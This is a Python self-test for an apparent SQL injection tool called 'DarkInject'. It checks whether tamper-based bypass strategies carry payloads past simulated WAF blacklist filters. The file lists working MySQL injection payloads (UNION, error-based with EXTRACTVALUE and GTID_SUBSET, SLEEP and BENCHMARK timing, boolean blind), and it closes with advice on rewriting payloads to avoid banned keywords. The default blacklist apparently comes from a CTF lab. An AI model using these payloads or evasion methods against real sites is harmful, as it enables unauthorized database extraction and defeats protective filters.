#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Blacklist bypass self-test (offline, no target needed)

Takes a set of "payloads the tool actually generates", applies each bypass strategy
produced by Planner, then feeds them through three filter semantics models to simulate
WAF processing, and checks whether the result still restores the original meaning.

Pass criterion:
    allowed and norm(after filtering) == norm(original)   →  the strategy is effective under this semantics

Usage:
    python selftest/blacklist_selftest.py [--blacklist FILE]
"""
import argparse
import os
import random
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.blacklist import (build_blacklist, Planner, simulate_filter,  # noqa: E402
                            ALL_MODELS, MODEL_LABEL)
from tamper.chain import TamperChain  # noqa: E402


# Representative payloads the tool actually generates (categorized by technique)
PAYLOADS = [
    ("union (numeric)",      "-1 UNION SELECT 1,2,3"),
    ("union (string)",      "-1' UNION SELECT 1,2,3 AND '1'='1"),
    ("error-based (extractvalue)", "1 AND (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)))"),
    ("error-based (GTID_SUBSET)", "1 AND (GTID_SUBSET(CONCAT(0x7e,(SELECT DATABASE()),0x7e),1))"),
    ("error-based (geometric function)",    "1 AND (MULTIPOINT((SELECT DATABASE())))"),
    ("time-based (SLEEP)",       "1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),SLEEP(3),0)"),
    ("time-based (BENCHMARK)",   "1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),BENCHMARK(10000000,MD5(1)),0)"),
    ("time-based (heavy query)",      "1 AND IF((1>2),(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C),0)"),
    ("boolean blind injection",          "1 AND (ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114)"),
]


def norm(s):
    """Normalize: strip whitespace + lowercase (ignore equivalence differences at the case/whitespace level)."""
    return re.sub(r"\s+", "", s or "").lower()


def evaluate(bl, strategies):
    """Return {(payload_idx, model): [passing strategy names]}"""
    result = {}
    for pi, (_, payload) in enumerate(PAYLOADS):
        for model in ALL_MODELS:
            ok = []
            for st in strategies:
                chain = TamperChain(st.tampers, blacklist=bl)
                tampered = chain.apply(payload)
                allowed, out = simulate_filter(tampered, bl.tokens, model)
                if allowed and norm(out) == norm(payload):
                    ok.append(st.name)
            result[(pi, model)] = ok
    return result


def main():
    random.seed(1337)   # fix the seed for random tampers like randomcase so output is reproducible
    ap = argparse.ArgumentParser()
    default_bl = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                              "..", "lab", "blacklist_ctf.txt")
    ap.add_argument("--blacklist", default=os.path.normpath(default_bl))
    ap.add_argument("--no-color", action="store_true",
                    help="Disable ANSI colors (auto-disabled anyway when output is redirected)")
    args = ap.parse_args()

    # Color: enabled only in an interactive terminal; plain text when redirected to a file
    use_color = (not args.no_color) and sys.stdout.isatty()

    # Show the path relative to the repo root only, to avoid writing a local absolute path into exported results
    repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    try:
        shown = os.path.relpath(os.path.abspath(args.blacklist), repo_root)
    except ValueError:      # cases like different drive letters where a relative path cannot be computed
        shown = args.blacklist
    if shown.startswith(".."):      # path outside the repo, keep only the file name
        shown = os.path.basename(args.blacklist)
    shown = shown.replace(os.sep, "/")

    bl = build_blacklist(path=args.blacklist)
    strategies = Planner(bl).strategies()

    print("=" * 78)
    print("  DarkInject — Blacklist Bypass Self-Test")
    print("=" * 78)
    print(f"  Blacklist: {shown}")
    print(bl.describe())
    print(f"  Candidate strategies: {', '.join(s.name for s in strategies)}")
    print("=" * 78)

    matrix = evaluate(bl, strategies)
    hit = 0
    total = 0

    for pi, (label, payload) in enumerate(PAYLOADS):
        print(f"\n▸ {label}")
        print(f"  payload: {payload}")
        for model in ALL_MODELS:
            ok = matrix[(pi, model)]
            total += 1
            if ok:
                hit += 1
            symbol = "✓" if ok else "✗"
            mark = f"\033[{'92' if ok else '91'}m{symbol}\033[0m" if use_color else symbol
            names = ", ".join(ok) if ok else "(no strategy available under this semantics)"
            print(f"    {mark} {MODEL_LABEL[model]:<18} → {names}")

    print("\n" + "=" * 78)
    print(f"  Bypassable combinations: {hit}/{total}")
    print("  Tip: under presence(reject on match), if the payload contains any banned word it will always be blocked;")
    print("       the real solution is to \"rewrite to avoid the keywords\" (boolean blind injection / heavy-query delay / non-banned error functions),")
    print("       not to count on tamper transformations.")
    print("=" * 78)


if __name__ == "__main__":
    main()
